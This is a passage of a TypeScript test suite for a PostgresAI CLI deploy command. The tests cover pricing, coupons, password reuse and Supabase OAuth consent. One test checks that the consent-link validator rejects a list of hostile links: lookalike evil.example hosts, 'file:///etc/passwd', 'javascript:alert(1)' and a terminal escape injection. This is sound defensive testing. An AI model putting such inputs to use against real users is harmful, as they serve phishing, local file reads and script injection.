    const r = await connect("postgresql://postgres:adminpw@DB.Example.com/app", { waitMs: 0 }, deps);
    expect(seen).toEqual(["db.example.com:5432"]);
    expect(r.price).toBe("included: same database cluster as db.example.com/other, no extra charge");
    expect(calls).toContain(`create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true })}`);
  });

  test("the price is per database cluster, and names the cluster's place on the subscription", () => {
    expect(priceText({ ...PAID } as never)).toBe("$512.00/month per database cluster (scale plan)");
    expect(priceText({ ...PAID, subscription: true, quantity: 2 } as never)).toBe("$512.00/month per database cluster (scale plan), cluster 3 on the subscription");
  });

  test("a repeating or permanent discount is not described as the first month only", async () => {
    const promo = (duration: string, extra: Record<string, unknown> = {}) => ({ code: "C", valid: true, discount_description: "x", duration, ...extra });
    const q = (p: Record<string, unknown>) => priceText({ ...PAID, promo: p, amount_after_promo: 25600 } as never);
    expect(q(promo("repeating", { duration_in_months: 3 }))).toBe("$256.00/month for 3 months with C (x), then $512.00/month per database cluster (scale plan)");
    expect(q(promo("forever"))).toBe("$256.00/month with C (x), instead of $512.00/month per database cluster (scale plan)");
  });

  test("a URL that cannot work (not an admin): the SQL before any price is asked, and nothing quoted", async () => {
    const { deps, calls } = make({}, {});
    deps.prepare = async (_u, provider, o) => { calls.push(`${o?.check ? "check" : "prepare"} ${provider}`); return { next: "Run the SQL as an admin", sql: "create role ..." }; };
    deps.confirm = async () => { throw new Error("asked"); };
    expect(await connect(SH, { waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      next: "Run the SQL as an admin", sql: "create role ...",
    });
    expect(calls).toEqual(["list", "check self-managed"]);
  });

  test("the price is shown on its own line before the prompt asks", async () => {
    const { deps } = make();
    const seen: string[] = [];
    deps.progress = (e) => seen.push(progressText(e));
    deps.confirm = async (q) => { seen.push(`ask ${q}`); return false; };
    await connect(SH, { waitMs: 0 }, deps);
    expect(seen).toEqual(["Estimated cost: $512.00/month per database cluster (scale plan) (+0s)", `ask Provision ${SH_NAME}? (y/N): `]);
  });

  test("the billing page is the platform's own (a preview's console, not production's)", async () => {
    const { deps } = make({ has_payment_method: false, requires_payment_method: true, billing_url: "https://console-pr.pgai.green/acme/billing" });
    expect((await connect(SH, { waitMs: 0, yes: true }, deps)).next).toBe("Add a payment method at https://console-pr.pgai.green/acme/billing, then re-run.");
  });

  test("an agent: the price, and to call again with yes; a coupon is checked first", async () => {
    const { deps, calls } = make();
    expect(await connect(SH, { waitMs: 0, agent: true }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: false,
      next: "Call deploy_monitoring again with yes: true to accept $512.00/month per database cluster (scale plan)",
    });
    const again = make({ promo: { code: "NOPE", valid: false, error: "Promo code not found or expired" } });
    expect((await connect(SH, { waitMs: 0, agent: true, yes: true, coupon: "NOPE" }, again.deps)).next)
      .toBe("Promo code NOPE: Promo code not found or expired. Nothing was changed: re-run with a valid code, or without coupon");
    expect([...calls, ...again.calls].filter((c) => c.startsWith("quote"))).toEqual(["quote", "quote NOPE"]);
  });

  // --reset-password takes the server's lock once the price is accepted: a
  // stop before that leaves the server free for the next run.
  test("--reset-password: no payment method, the price declined, a bad coupon, or a URL that cannot work: the lock is never taken", async () => {
    const noCard = make({ has_payment_method: false, requires_payment_method: true }, { rows: [undefined] });
    expect((await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, noCard.deps)).requires_payment_method).toBe(true);
    expect(noCard.calls).toEqual(["list", "check self-managed", "quote"]);
    const declined = make({}, { rows: [undefined], confirm: async () => false });
    expect((await connect(SH, { waitMs: 0, resetPassword: true }, declined.deps)).next).toStartWith("Re-run with --yes");
    expect(declined.calls).toEqual(["list", "check self-managed", "quote"]);
    const coupon = make({ promo: { code: "OLD", valid: false, error: "Promo code is expired" } }, { rows: [undefined] });
    expect((await connect(SH, { waitMs: 0, yes: true, coupon: "OLD", resetPassword: true }, coupon.deps)).next).toStartWith("Promo code OLD");
    expect(coupon.calls).toEqual(["list", "check self-managed", "quote OLD"]);
    const sql = make({}, { rows: [undefined] });
    sql.deps.prepare = async (_u, provider, o) => { sql.calls.push(`${o?.check ? "check" : "prepare"} ${provider}`); return { next: "Run the SQL as an admin", sql: "create role ..." }; };
    expect((await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, sql.deps)).next).toBe("Run the SQL as an admin");
    expect(sql.calls).toEqual(["list", "check self-managed"]);
  });

  for (const [what, err] of [["402", new HttpStatusError("Payment Required", 402)], ["402, declined", new HttpStatusError("Your card was declined.", 402)], ["412", new HttpStatusError("Precondition Failed", 412)]] as const) {
    test(`--reset-password: the platform refusing the box (${what}): the generated role is dropped before the lock is released`, async () => {
      const f = make({}, { rows: [undefined], create: async () => { throw err; } });
      f.deps.prepare = async (_u, provider, o) => { f.calls.push(`${o?.check ? "check" : "prepare"} ${provider}`); return o?.check ? { checked: true } : { monitoringUrl: MON, generated: true }; };
      expect((await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, f.deps)).status).toBe("action_required");
      expect(f.calls).toEqual(["list", "check self-managed", "quote", "resetLock db.example.com:5432", "list", "prepare self-managed", "unprepare", "resetUnlock l-1"]);
    });
  }

  // Another database on the same server, whose password the platform keeps.
  const FIRST = { id: "i-0", name: "db.example.com/first", cluster: "db.example.com:5432", provider: "self-managed", host_metrics: false, monitoring_password_stored: true };
  const NO_PW = "postgresql://postgres_ai_mon@db.example.com:5432/app";
  const storedPrepare = (seen: (boolean | undefined)[] = []): ConnectDeps["prepare"] => async (_u, _p, o) => {
    seen.push(o?.storedPassword);
    return o?.check ? { checked: true } : { monitoringUrl: NO_PW, storedPassword: true };
  };

  test("a second database on a server the platform keeps the password of: no PGAI_MON_PASSWORD needed, the box's URL has none", async () => {
    const { deps, calls } = make();
    const seen: (boolean | undefined)[] = [];
    deps.list = async () => { calls.push("list"); return calls.filter((c) => c === "list").length === 1 ? [row("active", FIRST)] : [row("active", FIRST), row("active", { name: SH_NAME, provider: "self-managed", host_metrics: false })]; };
    deps.prepare = storedPrepare(seen);
    const result = await connect(SH, { waitMs: 60_000, yes: true }, deps);
    expect(result.status).toBe("ready");
    expect(seen).toEqual([true, true]);
    expect(calls).toContain(`create ${JSON.stringify({ db_url: NO_PW, allow_ip_fallback: true, accept_price: true })}`);
  });

  test.each([
    ["kept, the box starting", {}, true],
    ["kept, the host in another case", { name: "DB.Example.COM/first", cluster: "DB.Example.COM:5432" }, true],
    ["not kept", { monitoring_password_stored: false }, undefined],
    ["kept for another server", { name: "db2.example.com/first", cluster: "db2.example.com:5432" }, undefined],
    ["kept for another port", { name: "db.example.com:6432/first", cluster: "db.example.com:6432" }, undefined],
    ["kept, its box being deleted", { status: "deleting_launched" }, undefined],
    ["kept, its box's delete failed", { status: "deleting_failed_to_launch" }, undefined],
  ] as const)("the platform's password is counted on only where it fills it in: %s", async (_, over, expected) => {
    const { deps } = make();
    const seen: (boolean | undefined)[] = [];
    deps.list = async () => [{ ...row("launch_requested", FIRST), ...over }];
    deps.prepare = storedPrepare(seen);
    await connect(SH, { waitMs: 0, yes: true }, deps);
    expect(seen).toEqual([expected, expected]);
  });

  test.each([
    ["a custom name on this cluster", { name: "Production orders", cluster: "db.example.com:5432" }, true],
    ["a matching name on another cluster", { name: FIRST.name, cluster: "other.example.com:5432" }, undefined],
    ["a custom name without a known cluster", { name: "db.example.com/orders data", cluster: null }, undefined],
    ["a one-word custom name without a known cluster", { name: "production", cluster: null }, undefined],
    ["a plain legacy name without a known cluster", { name: FIRST.name, cluster: null }, undefined],
  ] as const)("the stored password follows cluster identity: %s", async (_, identity, expected) => {
    const seen: (boolean | undefined)[] = [];
    const { deps } = make({}, { list: async () => [row("active", { ...FIRST, ...identity })], prepare: storedPrepare(seen) });
    await connect(SH, { waitMs: 0, yes: true }, deps);
    expect(seen).toEqual([expected, expected]);
  });

  test("--reset-password where the platform keeps the password: deploy without it, with PGAI_MON_PASSWORD, or delete what uses it first", async () => {
    const { deps, calls } = make({}, { list: async () => [row("active", FIRST)] });
    expect(await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      next: "A new password for postgres_ai_mon would cut off the monitoring of db.example.com/first on this server: deploy without --reset-password (PostgresAI keeps its password for this server, and sends it only over TLS), or set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete db.example.com/first --yes first",
    });
    expect(calls).toEqual([]);
  });

  test("--reset-password next to a box whose delete failed: retrying its deletion is named", async () => {
    const failed = row("deleting_failed_to_launch", { ...FIRST, monitoring_password_stored: false });
    const third = row("active", { id: "i-9", name: "db.example.com/third", cluster: "db.example.com:5432", provider: "self-managed", host_metrics: false });
    const { deps } = make({}, { list: async () => [failed, third] });
    expect((await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, deps)).next).toBe(
      "A new password for postgres_ai_mon would cut off the monitoring of db.example.com/first, db.example.com/third on this server: set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete db.example.com/first --yes and pgai mon instances delete db.example.com/third --yes first",
    );
  });

  test("--reset-password next to a box being deleted only: not refused, nothing of it is cut off", async () => {
    const { deps } = make({}, { list: async () => [row("deleting_launched", FIRST)] });
    const seen: unknown[] = [];
    deps.prepare = async (_u, _p, o) => { seen.push(o); return { next: "stop" }; };
    await connect(SH, { waitMs: 0, yes: true, resetPassword: true }, deps);
    expect(seen).toEqual([{ resetPassword: true, check: true, warn: expect.any(Function) }]);
  });

  test("the prepare step is told the server's other databases where the platform keeps the password, to name them in a refusal", async () => {
    const third = row("active", { id: "i-9", name: "db.example.com/third", cluster: "db.example.com:5432", provider: "self-managed", host_metrics: false });
    const { deps } = make({}, { list: async () => [row("active", FIRST), third] });
    const seen: unknown[] = [];
    deps.prepare = async (_u, _p, o) => { seen.push(o); return { next: "stop" }; };
    await connect(SH, { waitMs: 0, yes: true }, deps);
    expect(seen).toEqual([{ storedPassword: true, others: ["db.example.com/first", "db.example.com/third"], otherRefs: ["db.example.com/first", "db.example.com/third"], check: true, warn: expect.any(Function) }]);
    // A name two live boxes share: named for the redeploy, deleted by id.
    const twin = row("active", { ...third, id: "i-10" });
    deps.list = async () => [row("active", FIRST), third, twin];
    seen.length = 0;
    await connect(SH, { waitMs: 0, yes: true }, deps);
    expect(seen[0]).toMatchObject({ others: ["db.example.com/first", "db.example.com/third", "db.example.com/third"], otherRefs: ["db.example.com/first", "i-9", "i-10"] });
  });

  const NONE_STORED = "Failed to cloud monitoring connect: Conflict\nThe URL has no password, and none is stored for postgres_ai_mon on db.example.com:5432 in this organization.";
  const NAME_TAKEN = 'Failed to cloud monitoring connect: Conflict\nA monitoring instance named "db.example.com/app" already exists';

  test("the platform has no password for the server after all (409): --reset-password now cuts nothing off, not a failure", async () => {
    const create = async () => { throw new HttpStatusError(NONE_STORED, 409); };
    const cli = make({}, { list: async () => [row("active", FIRST)], create });
    cli.deps.prepare = storedPrepare();
    expect(await connect(SH, { waitMs: 0, yes: true }, cli.deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: false,
      next: "PostgresAI no longer keeps the password of postgres_ai_mon for this server: re-run with --reset-password (anything else that logs in as postgres_ai_mon then needs the new one), or set PGAI_MON_PASSWORD to its password",
    });
    const agent = make({}, { list: async () => [row("active", FIRST)], create });
    agent.deps.prepare = storedPrepare();
    expect((await connect(SH, { waitMs: 0, yes: true, agent: true }, agent.deps)).next).toBe(
      "PostgresAI no longer keeps the password of postgres_ai_mon for this server: pass its URL as database_url, or run pgai mon deploy <admin-url> --reset-password in a terminal",
    );
  });

  test("a 409 for anything else (the name taken by a parallel deploy), or for a URL with a password: the platform's own error", async () => {
    const stored = make({}, { list: async () => [row("active", FIRST)], create: async () => { throw new HttpStatusError(NAME_TAKEN, 409); } });
    stored.deps.prepare = storedPrepare();
    await expect(connect(SH, { waitMs: 0, yes: true }, stored.deps)).rejects.toThrow(NAME_TAKEN);
    const withPassword = make({}, { create: async () => { throw new HttpStatusError(NONE_STORED, 409); } });
    await expect(connect(SH, { waitMs: 0, yes: true }, withPassword.deps)).rejects.toThrow(NONE_STORED);
  });

  test("a re-run of a connected database asks no price", async () => {
    const f = fake({ rows: [row("active")] });
    f.deps.quote = quoted({}, f.calls);
    await connect(CH, { waitMs: 0 }, f.deps);
    expect(f.calls).toEqual(["list"]);
  });
});

describe("mon deploy for Supabase: connect the org through the browser (platform-all#890)", () => {
  const REF = "abcdefghijklmnopqrst";
  const SB = `postgresql://postgres:secretpw@db.${REF}.supabase.co:5432/postgres`;
  const SB_NAME = `db.${REF}.supabase.co/postgres`;
  // What the platform gets to find the project: the URL without the login.
  const SB_PUBLIC = `postgresql://db.${REF}.supabase.co:5432/postgres`;
  const AUTH = "https://api.supabase.com/v1/oauth/authorize?client_id=c&state=s";
  const sbRow = (status: string | null) => row(status, { name: SB_NAME, provider: "supabase", cluster: `db.${REF}.supabase.co:5432`, database: "postgres", host_metrics: false });
  const make = (over: Parameters<typeof fake>[0] & { statuses?: { status: string; error?: string }[] } = {}) => {
    const statuses = over.statuses ?? [];
    let polled = 0;
    const f = fake({ rows: [undefined, sbRow("launch_requested"), sbRow("active")], ...over });
    f.deps.quote = async (coupon, cluster) => { f.calls.push(`quote${cluster ? ` ${cluster}` : ""}${coupon ? ` ${coupon}` : ""}`); return { ...FREE_QUOTE, ...(coupon ? { promo: { code: coupon, valid: true } } : {}) }; };
    f.deps.supabaseStart = over.supabaseStart ?? (async (dbUrl) => { f.calls.push(`start ${dbUrl}`); return { connected: true, project_ref: REF }; });
    f.deps.supabaseStatus = over.supabaseStatus ?? (async (id) => { f.calls.push(`status ${id}`); return statuses[Math.min(polled++, statuses.length - 1)] as never; });
    f.deps.supabaseConnect = over.supabaseConnect ?? (async (body) => { f.calls.push(`connect ${JSON.stringify(body)}`); return { id: "i-1", name: SB_NAME, status: "launch_requested" }; });
    f.deps.openUrl = over.openUrl ?? ((url) => { f.calls.push(`open ${url}`); });
    return f;
  };
  const oauth = (f: ReturnType<typeof make>) => {
    f.deps.supabaseStart = async (dbUrl) => { f.calls.push(`start ${dbUrl}`); return { auth_url: AUTH, session_id: "sess-1" }; };
  };

  // The price is the org's (a Supabase provision bills every box), not a per-cluster one: no db_server.
  test("an org already connected to Supabase: price, then the box; the database is never logged in to", async () => {
    const { deps, calls } = make();
    const result = await connect(SB, { waitMs: 0 }, deps);
    expect(result).toEqual({
      status: "in_progress", provider: "supabase", name: SB_NAME, id: "i-1", dashboard_url: null, host_metrics: false,
      ...FREE, next: "pgai mon instances watch i-1",
    });
    expect(calls).toEqual(["list", `start ${SB_PUBLIC}`, "quote", `connect ${JSON.stringify({ project_ref: REF })}`]);
  });

  // Live on the preview (2026-10-13): the box stayed launch_requested and deploy ended with exit 0 after its wait.
  test("the box still launch_requested when the wait ends: action required (exit 3), resume with instances watch", async () => {
    let t = 0;
    const { deps } = make({ rows: [undefined, sbRow("launch_requested")], now: () => t, sleep: async (ms) => { t += ms; } });
    expect(await connect(SB, { waitMs: 20 * 60_000 }, deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME, id: "i-1", dashboard_url: null, host_metrics: false, ...FREE,
      next: "Still in progress (box: starting) when the wait ended: resume with pgai mon instances watch i-1",
    });
    expect(t).toBeGreaterThanOrEqual(20 * 60_000);
  });

  // REV r1 (note_4008991901): the CLI neither prepares the database nor runs the checkup here; the box does both, later.
  test("at a terminal the steps are Supabase's: no step is done before the box does it", async () => {
    const out: string[] = [];
    const view = new StepView("Deploying", monitoringSteps("supabase"), false, (s) => out.push(s), () => 0);
    const steps = stepProgress({ json: false, tty: true, makeView: () => view, writeLine: (s) => out.push(`${s}\n`), writeEvent: () => {} });
    const { deps } = make({ rows: [undefined, sbRow("launch_requested")], progress: steps.progress, now: () => 0 });
    await connect(SB, { waitMs: 0 }, deps);
    expect(out.join("")).toBe([
      "Estimated cost: free (1 of 1 free slots)",
      "Deploying",
      "Connect Supabase: done (0s)",
      "Create the monitoring box: started",
      "Create the monitoring box: done (0s)",
      "Prepare the database and install monitoring (1-5 min): started",
      "",
    ].join("\n"));
  });

  test("another database of the project, monitored on its own, is not this deploy's box: provisions", async () => {
    const { deps, calls } = make({ rows: [{ ...sbRow("active"), id: "i-orders", database: "orders" }, sbRow("launch_requested")] });
    const result = await connect(SB, { waitMs: 0 }, deps);
    expect(result).toMatchObject({ status: "in_progress", id: "i-1" });
    expect(calls).toContain(`connect ${JSON.stringify({ project_ref: REF })}`);
  });

  test("Ctrl-C while the box request is in flight: the box exists, so the run detaches without polling", async () => {
    let stop = false;
    const f = make();
    f.deps.supabaseConnect = async () => { stop = true; return { id: "i-1", name: SB_NAME, status: "launch_requested" }; };
    f.deps.aborted = () => stop;
    expect(await connect(SB, { waitMs: 60_000 }, f.deps)).toMatchObject({ status: "in_progress", id: "i-1", next: "pgai mon instances watch i-1" });
    expect(f.calls.filter((c) => c === "sleep")).toEqual([]);
  });

  test("a pooler URL names the same project: the project ref from the user name", async () => {
    const { deps, calls } = make();
    const result = await connect(`postgresql://postgres.${REF}:secretpw@aws-0-eu-central-1.pooler.supabase.com:6543/postgres`, { waitMs: 0 }, deps);
    expect(result).toMatchObject({ status: "in_progress", provider: "supabase", name: SB_NAME });
    expect(calls[1]).toBe(`start ${SB_PUBLIC}`);
  });

  test("no Supabase connection yet: the browser opens on the consent page, deploy waits for it, then provisions", async () => {
    const events: ProgressEvent[] = [];
    const f = make({ statuses: [{ status: "pending" }, { status: "pending" }, { status: "connected" }], progress: (e) => events.push(e) });
    oauth(f);
    const result = await connect(SB, { waitMs: 60_000, name: "orders", coupon: "WELCOME", vcpus: 2 }, f.deps);
    expect(result).toMatchObject({ status: "ready", provider: "supabase", name: SB_NAME, id: "i-1" });
    expect(f.calls.slice(0, 10)).toEqual([
      "list", `start ${SB_PUBLIC}`, `open ${AUTH}`,
      "status sess-1", "sleep", "status sess-1", "sleep", "status sess-1",
      "quote WELCOME",
      `connect ${JSON.stringify({ project_ref: REF, name: "orders", promo_code: "WELCOME", vcpus: 2 })}`,
    ]);
    // The link is printed too (another machine, a browser that did not open), and is its own field for a script.
    expect(events[0]).toMatchObject({ event: "preparing", auth_url: AUTH,
      message: `Connect Supabase to PostgresAI: approve access in the browser (open ${AUTH} if it did not open). Waiting...` });
    expect(events.map((e) => e.event)).toContain("box");
  });

  // REV r4/r5 potential: the link comes from the platform; only Supabase's own https page is opened or shown.
  test("a consent link that is not https on api.supabase.com: failed, never opened, shown or waited for", async () => {
    for (const bad of [
      "http://api.supabase.com/v1/oauth/authorize?state=s", "https://api.supabase.com.evil.example/v1/oauth/authorize",
      "https://evil.example/?https://api.supabase.com/", "https://user@evil.example/", "file:///etc/passwd",
      "x-scheme://api.supabase.com/", "https://evil@api.supabase.com/", "https://api.supabase.com:8443/", "--help", "javascript:alert(1)", "https://api.supabase.com\x1b[2J/",
    ]) {
      for (const o of [{ waitMs: 60_000 }, { waitMs: 0 }, { waitMs: 0, agent: true }]) {
        const events: ProgressEvent[] = [];
        const f = make({ statuses: [{ status: "connected" }], progress: (e) => events.push(e) });
        f.deps.supabaseStart = async () => ({ auth_url: bad, session_id: "sess-1" });
        const result = await connect(SB, o, f.deps);
        expect(result).toEqual({ status: "failed", provider: "supabase", name: SB_NAME,
          next: "The platform sent a Supabase consent link that is not https://api.supabase.com: not opened. Re-run pgai mon deploy later." });
        expect(f.calls).toEqual(["list"]);
        expect(events).toEqual([]);
      }
    }
  });

  test("an agent (or --wait 0): the consent link as the next step (exit 3), nothing waited for or created", async () => {
    for (const [o, next] of [
      [{ agent: true }, `Open ${AUTH} in a browser and approve PostgresAI's access to Supabase, then call deploy_monitoring again`],
      [{}, `Open ${AUTH} in a browser and approve PostgresAI's access to Supabase, then re-run`],
    ] as const) {
      const f = make();
      oauth(f);
      expect(await connect(SB, { waitMs: 0, ...o }, f.deps)).toEqual({ status: "action_required", provider: "supabase", name: SB_NAME, next });
      expect(f.calls).toEqual(["list", `start ${SB_PUBLIC}`]);
    }
  });

  test("an agent's URL needs no password: it only names the project", async () => {
    const { deps, calls } = make();
    expect((await connect(`postgresql://postgres@db.${REF}.supabase.co:5432/postgres`, { waitMs: 0, agent: true }, deps)).status).toBe("in_progress");
    expect(calls[1]).toBe(`start ${SB_PUBLIC}`);
  });

  test("Supabase refused, or nobody approved in time: what happened and the re-run, nothing created", async () => {
    const refused = make({ statuses: [{ status: "error", error: "access_denied" }] });
    oauth(refused);
    expect(await connect(SB, { waitMs: 60_000 }, refused.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME,
      next: "Supabase did not connect: access_denied. Re-run to try again",
    });
    expect(refused.calls).toEqual(["list", `start ${SB_PUBLIC}`, `open ${AUTH}`, "status sess-1"]);

    let t = 0;
    const late = make({ statuses: [{ status: "pending" }], now: () => (t += 20_000) });
    oauth(late);
    expect(await connect(SB, { waitMs: 60_000 }, late.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME,
      next: `Open ${AUTH} in a browser and approve PostgresAI's access to Supabase, then re-run`,
    });
    expect(late.calls.filter((c) => c.startsWith("connect"))).toEqual([]);
  });

  test("the consent link expires before --wait ends: polling stops at expires_at, and says to re-run for a new link", async () => {
    const T0 = Date.parse("2026-10-13T12:00:00Z");
    let t = T0;
    const f = make({ statuses: [{ status: "pending" }], now: () => (t += 20_000) });
    f.deps.supabaseStart = async (dbUrl) => {
      f.calls.push(`start ${dbUrl}`);
      return { auth_url: AUTH, session_id: "sess-1", expires_at: new Date(T0 + 30_000).toISOString() };
    };
    expect(await connect(SB, { waitMs: 600_000 }, f.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME,
      next: "The Supabase consent link expired before it was approved: re-run pgai mon deploy for a new one",
    });
    expect(f.calls).toEqual(["list", `start ${SB_PUBLIC}`, `open ${AUTH}`, "status sess-1"]);
  });

  test("Ctrl-C while waiting for the browser: cancelled, nothing created", async () => {
    let stop = false;
    const f = make({ statuses: [{ status: "pending" }], aborted: () => stop });
    oauth(f);
    f.deps.sleep = async () => { f.calls.push("sleep"); stop = true; };
    await expect(connect(SB, { waitMs: 60_000 }, f.deps)).rejects.toBeInstanceOf(CancelledError);
    expect(f.calls.filter((c) => c.startsWith("connect") || c.startsWith("quote"))).toEqual([]);
  });

  test("already monitored: its state, no browser and no price", async () => {
    const { deps, calls } = make({ rows: [sbRow("active")] });
    expect(await connect(SB, { waitMs: 0 }, deps)).toMatchObject({ status: "ready", provider: "supabase", id: "i-1" });
    expect(calls).toEqual(["list"]);
  });

  test("a billed box: accepted (--yes) goes with accept_price; without it, or with no payment method, nothing is created", async () => {
    const PAID = { ...FREE_QUOTE, billed: true, free_slots: { remaining: 0, total: 0 }, has_payment_method: true };
    const yes = make();
    yes.deps.quote = async () => PAID;
    await connect(SB, { waitMs: 0, yes: true }, yes.deps);
    expect(yes.calls.at(-1)).toBe(`connect ${JSON.stringify({ project_ref: REF, accept_price: true })}`);

    const no = make();
    no.deps.quote = async () => PAID;
    expect((await connect(SB, { waitMs: 0 }, no.deps)).next).toBe("Re-run with --yes to accept $512.00/month per database cluster (scale plan)");
    expect(no.calls.filter((c) => c.startsWith("connect"))).toEqual([]);

    const card = make();
    card.deps.quote = async () => ({ ...PAID, has_payment_method: false, requires_payment_method: true });
    expect((await connect(SB, { waitMs: 0, yes: true }, card.deps)).next).toBe("Add a payment method at https://console.postgres.ai/acme/billing, then re-run.");
    expect(card.calls.filter((c) => c.startsWith("connect"))).toEqual([]);

    const gone = make({ supabaseConnect: async () => { throw new HttpStatusError("cloud monitoring supabase connect: HTTP 402\nno payment method", 402); } });
    expect((await connect(SB, { waitMs: 0 }, gone.deps)).next).toBe("Add a payment method at https://console.postgres.ai/acme/billing, then re-run.");
  });

  test("the box monitors the project's postgres database: another database is refused before anything is called", async () => {
    const f = make({ rows: [sbRow("active")] });
    expect(await connect(`postgresql://postgres:p@db.${REF}.supabase.co:5432/orders`, { waitMs: 0 }, f.deps)).toEqual({
      status: "action_required", provider: "supabase", name: `db.${REF}.supabase.co/orders`,
      next: "PostgresAI monitors a Supabase project through its postgres database: use the URL of the postgres database",
    });
    expect(f.calls).toEqual([]);
  });

  test("the platform refuses the project (another Supabase organization is connected) or the user (not an admin): its words, exit 3", async () => {
    const other = make({ supabaseStart: async () => { throw new HttpStatusError("cloud monitoring supabase start: HTTP 409\nSupabase project x is not in Acme.\nUse a project of that Supabase organization.", 409); } });
    expect(await connect(SB, { waitMs: 0 }, other.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME, next: "Supabase project x is not in Acme.\nUse a project of that Supabase organization.",
    });
    const member = make({ supabaseStart: async () => { throw new HttpStatusError("cloud monitoring supabase start: HTTP 403\nnot an admin", 403); } });
    expect((await connect(SB, { waitMs: 0 }, member.deps)).status).toBe("action_required");
  });

  test("the platform refuses the box (an org billed by a partner): its words, exit 3", async () => {
    const partner = make({ supabaseConnect: async () => { throw new HttpStatusError("cloud monitoring supabase connect: HTTP 409\nThis organization is billed by a partner.\nDeploy monitoring from the console.", 409); } });
    expect(await connect(SB, { waitMs: 0 }, partner.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME, next: "This organization is billed by a partner.\nDeploy monitoring from the console.",
    });
  });

  // platform-all#972: the platform places the box (by default in the project's own region on AWS);
  // --cloud/--location are asked of it, before the price, and go with the box request.
  test("--cloud/--location: the platform places the Supabase box, shown before the price, sent with the request", async () => {
    const f = make();
    const lines: string[] = [];
    f.deps.progress = (e) => lines.push(e.message);
    f.deps.deployOptions = async (args) => {
      f.calls.push(`options ${JSON.stringify(args)}`);
      return { clouds: [], locations: {}, error: null,
        choice: { cloud: "hetzner", cloud_label: "Hetzner", location: "hel1", location_label: "FI Helsinki", reason: "explicit", reason_text: "as chosen" } };
    };
    const result = await connect(SB, { waitMs: 0, cloud: "Hetzner", location: "hel1", yes: true }, f.deps);
    expect(result).toMatchObject({ status: "in_progress", cloud: "hetzner", location: "hel1", location_reason: "explicit" });
    expect(f.calls).toEqual(["list", `start ${SB_PUBLIC}`,
      `options ${JSON.stringify({ supabase_project_ids: [REF], cloud: "hetzner", location: "hel1", check_stock: true })}`,
      "quote", `connect ${JSON.stringify({ project_ref: REF, cloud: "hetzner", location: "hel1" })}`]);
    expect(lines.indexOf("Monitoring box: Hetzner, hel1 (as chosen)")).toBeLessThan(lines.findIndex((l) => l.startsWith("Estimated cost")));
  });

  // A17: the same question for a Supabase box; nobody to ask: the choices come back, no box.
  test("without --yes and nobody to ask: the Supabase box is not requested, the choices come back", async () => {
    const f = make();
    f.deps.deployOptions = async () => ({ clouds: [{ code: "aws", label: "AWS", available: true }, { code: "hetzner", label: "Hetzner", available: true }],
      locations: { aws: [{ code: "eu-central-1", label: "Europe (Frankfurt)", world_part: "Europe" }], hetzner: [{ code: "fsn1", label: "DE Falkenstein", world_part: "Europe" }] },
      error: null, choice: { cloud: "aws", cloud_label: "AWS", location: "eu-central-1", location_label: null, reason: "supabase_project", reason_text: "the Supabase project's region" } });
    const result = await connect(SB, { waitMs: 0 }, f.deps);
    expect(result).toMatchObject({ status: "action_required", cloud: "aws", location: "eu-central-1", location_reason: "supabase_project", choices: { aws: ["eu-central-1"], hetzner: ["fsn1"] } });
    expect(f.calls.some((c) => c.startsWith("connect "))).toBe(false);
  });

  // A platform from before --cloud places a Supabase box itself: a --location it would drop is refused.
  test("a platform from before --cloud: --location for Supabase is refused, nothing is created", async () => {
    const f = make();
    f.deps.deployOptions = async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); };
    await expect(connect(SB, { waitMs: 0, location: "eu-west-1" }, f.deps)).rejects.toThrow(
      "This PostgresAI platform does not take --location for Supabase yet: re-run without it. Nothing was created.");
    expect(f.calls.some((c) => c.startsWith("connect "))).toBe(false);
  });

  test("a box removed before it became active: failed, not still in progress", async () => {
    const { deps } = make({ rows: [undefined, undefined] });
    expect(await connect(SB, { waitMs: 60_000 }, deps)).toEqual({
      status: "failed", provider: "supabase", name: SB_NAME, id: "i-1", ...FREE,
      next: "The monitoring box was removed before it became active: see pgai mon instances list, then re-run pgai mon deploy",
    });
  });

  test("a URL that names no Supabase project, and --reset-password: refused before anything is called", async () => {
    const f = make();
    expect(await connect("postgresql://postgres:p@10.0.0.5:5432/postgres", { provider: "supabase", waitMs: 0 }, f.deps)).toEqual({
      status: "action_required", provider: "supabase", name: "10.0.0.5/postgres",
      next: "Not a Supabase project URL: use the project's connection string (db.<project-ref>.supabase.co, or the pooler with user postgres.<project-ref>), or pass --provider supabase without a URL to pick the project",
    });
    expect(await connect(SB, { resetPassword: true, waitMs: 0 }, f.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME,
      next: "--reset-password does not apply to Supabase: PostgresAI creates postgres_ai_mon through the Supabase Management API",
    });
    expect(f.calls).toEqual([]);
  });

  // postgresai!483: the platform creates postgres_ai_mon on Supabase, so another role would never be used.
  test.each([
    ["a custom role", "my_mon", false],
    ["a blank one", "  ", false],
    ["a custom role, from an agent", "my_mon", true],
  ] as const)("--monitoring-user, %s: refused before anything is called", async (_what, monitoringUser, agent) => {
    const f = make();
    expect(await connect(SB, { monitoringUser, agent, waitMs: 0 }, f.deps)).toEqual({
      status: "action_required", provider: "supabase", name: SB_NAME,
      next: `${agent ? "monitoring_user" : "--monitoring-user"} does not apply to Supabase: PostgresAI creates postgres_ai_mon through the Supabase Management API`,
    });
    expect(f.calls).toEqual([]);
  });

  test("--monitoring-user postgres_ai_mon (the CLI's default) is the role the platform creates: deploys", async () => {
    const { deps, calls } = make();
